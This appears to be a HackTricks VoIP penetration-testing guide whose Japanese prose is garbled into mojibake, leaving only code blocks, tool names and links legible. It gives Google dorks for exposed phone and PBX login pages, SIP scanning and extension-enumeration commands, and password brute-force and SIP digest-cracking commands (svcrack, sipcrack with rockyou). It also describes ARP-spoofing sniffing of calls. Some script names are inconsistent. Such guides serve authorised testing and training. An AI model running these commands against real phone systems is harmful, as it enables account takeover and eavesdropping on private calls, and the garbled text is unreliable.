# VoIPã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## VoIPã®åŸºæœ¬æƒ…å ±

VoIPã®å‹•ä½œã«ã¤ã„ã¦å­¦ã¶ãŸã‚ã«ã¯ã€æ¬¡ã®ãƒªãƒ³ã‚¯ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIPã®åˆ—æŒ™

### é›»è©±ç•ªå·

Red TeamãŒæœ€åˆã«è¡Œã†ã¹ãæ‰‹é †ã®1ã¤ã¯ã€OSINTãƒ„ãƒ¼ãƒ«ã€Googleæ¤œç´¢ã€ã¾ãŸã¯Webãƒšãƒ¼ã‚¸ã®ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ã€ä¼æ¥­ã¨é€£çµ¡ã‚’å–ã‚‹ãŸã‚ã®åˆ©ç”¨å¯èƒ½ãªé›»è©±ç•ªå·ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã™ã€‚

é›»è©±ç•ªå·ã‚’å–å¾—ã—ãŸã‚‰ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ãŒVoIPã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã§ã€ä¼æ¥­ãŒVoIPã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™...ã•ã‚‰ã«ã€ä¼æ¥­ãŒVoIPã‚µãƒ¼ãƒ“ã‚¹ã‚’å¥‘ç´„ã—ã¦ã„ãªã„å ´åˆã§ã‚‚ã€PSTNã‚«ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ç‹¬è‡ªã®VoIP PBXã‚’å¾“æ¥ã®é›»è©±ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«æ¥ç¶šã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

è‡ªå‹•å¿œç­”ã‚„éŸ³æ¥½ãªã©ã®ã‚‚ã®ã¯ã€VoIPãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINTæƒ…å ±

VoIPã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ç‰¹å®šã«å½¹ç«‹ã¤ä»–ã®OSINTæƒ…å ±ã¯ã€Red Teamã«ã¨ã£ã¦æœ‰ç›Šã§ã™ã€‚

### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™

* **`nmap`**ã¯UDPã‚µãƒ¼ãƒ“ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ãŒå¯èƒ½ã§ã™ãŒã€ã‚¹ã‚­ãƒ£ãƒ³ã•ã‚Œã‚‹UDPã‚µãƒ¼ãƒ“ã‚¹ã®æ•°ãŒå¤šã„ãŸã‚ã€éå¸¸ã«é…ãã€ã“ã®ç¨®ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã¯æ­£ç¢ºã§ã¯ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
* SIPViciousã®**`svmap`**ï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼šæŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®SIPã‚µãƒ¼ãƒ“ã‚¹ã‚’ç‰¹å®šã—ã¾ã™ã€‚
* `svmap`ã¯**ç°¡å˜ã«ãƒ–ãƒ­ãƒƒã‚¯ã§ãã¾ã™**ã€‚ãªãœãªã‚‰ã€User-Agentã¨ã—ã¦`friendly-scanner`ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ãŒã€`/usr/share/sipvicious/sipvicious`ã®ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§å¯¾å‡¦ã§ãã¾ã™ã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscanã¯ã€UDPã€TCPã€ã¾ãŸã¯TLSã‚’ä»‹ã—ãŸSIPã‚µãƒ¼ãƒ“ã‚¹ã®éå¸¸ã«é«˜é€Ÿãªã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚ãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã€å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç¯„å›²ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç¯„å›²ã‚’ç°¡å˜ã«æŒ‡å®šã—ãŸã‚Šã€TCPã¨UDPã®ä¸¡æ–¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã‚Šã€åˆ¥ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ãŸã‚Šï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯OPTIONSã‚’ä½¿ç”¨ã—ã¾ã™ï¼‰ã€ç•°ãªã‚‹User-Agentã‚’æŒ‡å®šã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãã®ä»–ã‚‚å¯èƒ½ã§ã™ï¼‰ã€‚
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploitã¯ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚„è„†å¼±æ€§è©•ä¾¡ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã™ã€‚Metasploitã¯ã€æ§˜ã€…ãªè„†å¼±æ€§ã‚’æ¤œå‡ºã—ã€æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã‚»ãƒƒãƒˆã‚’æä¾›ã—ã¾ã™ã€‚ã“ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã«ã‚ˆã£ã¦åºƒãä½¿ç”¨ã•ã‚Œã¦ãŠã‚Šã€è„†å¼±æ€§ã®è¨ºæ–­ã‚„ä¾µå…¥ãƒ†ã‚¹ãƒˆã«ãŠã„ã¦éå¸¸ã«åŠ¹æœçš„ã§ã™ã€‚Metasploitã¯ã€æ”»æ’ƒè€…ãŒã‚·ã‚¹ãƒ†ãƒ ã«ä¾µå…¥ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®æ‰‹æ³•ã‚’é–‹ç™ºã™ã‚‹ãŸã‚ã®è²´é‡ãªãƒªã‚½ãƒ¼ã‚¹ã§ã™ã€‚
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### è¿½åŠ ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™

PBXã¯ä»–ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã‚‚å…¬é–‹ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã¯ãã®ä¾‹ã§ã™ï¼š

* **69/UDP (TFTP)**: ãƒ•ã‚¡ãƒ¼ãƒ ã‚¦ã‚§ã‚¢ã®æ›´æ–°
* **80 (HTTP) / 443 (HTTPS)**: ã‚¦ã‚§ãƒ–ã‹ã‚‰ãƒ‡ãƒã‚¤ã‚¹ã‚’ç®¡ç†ã™ã‚‹ãŸã‚
* **389 (LDAP)**: ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’ä¿å­˜ã™ã‚‹ãŸã‚ã®ä»£æ›¿æ‰‹æ®µ
* **3306 (MySQL**): MySQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
* **5038 (Manager)**: ä»–ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰Asteriskã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã®æ©Ÿèƒ½
* **5222 (XMPP)**: Jabberã‚’ä½¿ç”¨ã—ãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°
* **5432 (PostgreSQL)**: PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
* ãã®ä»–...

### ãƒ¡ã‚½ãƒƒãƒ‰ã®åˆ—æŒ™

`sipenumerate.py`ã‚’ä½¿ç”¨ã—ã¦ã€PBXã§ä½¿ç”¨å¯èƒ½ãªãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚[**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### æ‹¡å¼µå­ã®åˆ—æŒ™

PBXï¼ˆãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ–ãƒ©ãƒ³ãƒäº¤æ›ï¼‰ã‚·ã‚¹ãƒ†ãƒ ã®æ‹¡å¼µå­ã¯ã€çµ„ç¹”ã‚„ãƒ“ã‚¸ãƒã‚¹å†…ã®å€‹ã€…ã®é›»è©±å›ç·šã€ãƒ‡ãƒã‚¤ã‚¹ã€ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸ**ä¸€æ„ã®å†…éƒ¨è­˜åˆ¥å­**ã‚’æŒ‡ã—ã¾ã™ã€‚æ‹¡å¼µå­ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€çµ„ç¹”å†…ã§ã®é€šè©±ã®**åŠ¹ç‡çš„ãªãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚å€‹ã€…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ãƒ‡ãƒã‚¤ã‚¹ã”ã¨ã«å€‹åˆ¥ã®å¤–éƒ¨é›»è©±ç•ªå·ãŒå¿…è¦ãªããªã‚Šã¾ã™ã€‚

* SIPViciousã®**`svwar`**ï¼ˆ`sudo apt install sipvicious`ï¼‰: `svwar`ã¯ç„¡æ–™ã®SIP PBXæ‹¡å¼µå­ãƒ©ã‚¤ãƒ³ã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚æ¦‚å¿µçš„ã«ã¯ã€**æ‹¡å¼µå­ã®ç¯„å›²ã‚’æ¨æ¸¬ã—ãŸã‚Šã€æŒ‡å®šã•ã‚ŒãŸæ‹¡å¼µå­ã®ãƒªã‚¹ãƒˆã‚’æ¨æ¸¬ã™ã‚‹**ã“ã¨ã«ã‚ˆã£ã¦ã€å¾“æ¥ã®ãƒ¯ãƒ¼ãƒ‰ãƒ€ã‚¤ãƒ¤ãƒ©ãƒ¼ã¨åŒæ§˜ã«å‹•ä½œã—ã¾ã™ã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Sipextenã¯SIPã‚µãƒ¼ãƒãƒ¼ä¸Šã®æ‹¡å¼µæ©Ÿèƒ½ã‚’ç‰¹å®šã—ã¾ã™ã€‚Sipextenã¯å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¨ãƒãƒ¼ãƒˆç¯„å›²ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Metasploitã‚’ä½¿ç”¨ã—ã¦ã€æ‹¡å¼µå­ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**ã¯ã€Inter Asterisk Exchangeãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼åãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚¨ãƒ³ã‚¸ãƒ³**ã§ã™ã€‚enumIAXã¯ã€2ã¤ã®ç•°ãªã‚‹ãƒ¢ãƒ¼ãƒ‰ã§å‹•ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚·ãƒ¼ã‚±ãƒ³ã‚·ãƒ£ãƒ«ãªãƒ¦ãƒ¼ã‚¶ãƒ¼åã®æ¨æ¸¬ã¾ãŸã¯è¾æ›¸æ”»æ’ƒã§ã™ã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIPæ”»æ’ƒ

### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

**PBX**ã¨ã„ãã¤ã‹ã®**æ‹¡å¼µå­/ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’ç™ºè¦‹ã—ãŸå ´åˆã€Red Teamã¯ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¾æ›¸ã‚’ä½¿ç”¨ã—ã¦ã€`REGISTER`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä»‹ã—ã¦æ‹¡å¼µå­ã«å¯¾ã—ã¦èªè¨¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="danger" %}
**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã¯æ‹¡å¼µå­ã¨åŒã˜ã§ã‚ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ãŒã€ã“ã‚Œã¯PBXã‚·ã‚¹ãƒ†ãƒ ã€ãã®è¨­å®šã€ãŠã‚ˆã³çµ„ç¹”ã®è¨­å®šã«ã‚ˆã£ã¦ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™...

ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒæ‹¡å¼µå­ã¨ç•°ãªã‚‹å ´åˆã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ç‰¹å®šã—ã¦ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

* **SIPViciousã®`svcrack`**ï¼ˆ`sudo apt install sipvicious`ï¼‰: SVCrackã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€PBXä¸Šã®ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å/æ‹¡å¼µå­ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crackã¯ã€SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«å†…ã®ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIPã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

ã‚‚ã—VoIPæ©Ÿå™¨ãŒ**ã‚ªãƒ¼ãƒ—ãƒ³Wifiãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**å†…ã«ã‚ã‚‹å ´åˆã€ã‚ãªãŸã¯**ã™ã¹ã¦ã®æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ã‚‚ã£ã¨é–‰ã˜ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆEthernetã§æ¥ç¶šã•ã‚ŒãŸã‚Šã€ä¿è­·ã•ã‚ŒãŸWifiã§æ¥ç¶šã•ã‚ŒãŸã‚Šï¼‰ã«ã„ã‚‹å ´åˆã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ãªã©ã®**MitMæ”»æ’ƒ**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**PBXã¨ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤**ã®é–“ã§æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ±ã®ä¸­ã«ã¯ã€æ©Ÿå™¨ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®**ã‚¦ã‚§ãƒ–ã®è³‡æ ¼æƒ…å ±**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**æ‹¡å¼µå­**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**IP**ã‚¢ãƒ‰ãƒ¬ã‚¹ã€ã•ã‚‰ã«ã¯**ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„**RTPãƒ‘ã‚±ãƒƒãƒˆ**ãªã©ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ã“ã‚Œã‚‰ã‚’å†ç”Ÿã—ã¦**ä¼šè©±ã‚’èã**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€Wiresharkã€tcpdumpãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€VoIPä¼šè©±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ãŸã‚ã«ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹**ucsniff**ï¼ˆ[https://github.com/Seabreg/ucsniff](https://github.com/Seabreg/ucsniff)ï¼‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

{% hint style="danger" %}
**SIPé€šä¿¡ã§TLSãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€SIPé€šä¿¡ã‚’å¹³æ–‡ã§è¡¨ç¤ºã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚\
åŒæ§˜ã«ã€**SRTP**ã‚„**ZRTP**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**RTPãƒ‘ã‚±ãƒƒãƒˆã¯å¹³æ–‡ã§ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚
{% endhint %}

#### SIPã®è³‡æ ¼æƒ…å ±

**SIP REGISTERé€šä¿¡**ã®ä¾‹ã‚’ç¢ºèªã—ã¦ã€**è³‡æ ¼æƒ…å ±ãŒã©ã®ã‚ˆã†ã«é€ä¿¡ã•ã‚Œã‚‹ã‹**ã‚’ç†è§£ã—ã¦ãã ã•ã„ã€‚

* **`sipdump`** & **`sipcrack`**ï¼ˆ**sipcrack**ã®ä¸€éƒ¨ï¼‰ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šã“ã‚Œã‚‰ã®ãƒ„ãƒ¼ãƒ«ã¯ã€SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«å†…ã®**ãƒ€ã‚¤ã‚¸ã‚§ã‚¹ãƒˆèªè¨¼**ã‚’**pcap**ã‹ã‚‰**æŠ½å‡º**ã—ã€ãã‚Œã‚‰ã‚’**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark**ã¯PCAPãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ãƒ‡ãƒ¼ã‚¿ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
* **SipDump**ã¯PCAPãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰SIP Digestèªè¨¼ã‚’æŠ½å‡ºã—ã¾ã™ã€‚
* **SIP Digest Crack**ã¯SIPãƒ—ãƒ­ãƒˆã‚³ãƒ«å†…ã®Digestèªè¨¼ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMFã‚³ãƒ¼ãƒ‰

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯å†…ã«ã¯ã€SIPã®è³‡æ ¼æƒ…å ±ã ã‘ã§ãªãã€**DTMFã‚³ãƒ¼ãƒ‰**ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ‰ã¯ã€ä¾‹ãˆã°**ãƒœã‚¤ã‚¹ãƒ¡ãƒ¼ãƒ«**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚\
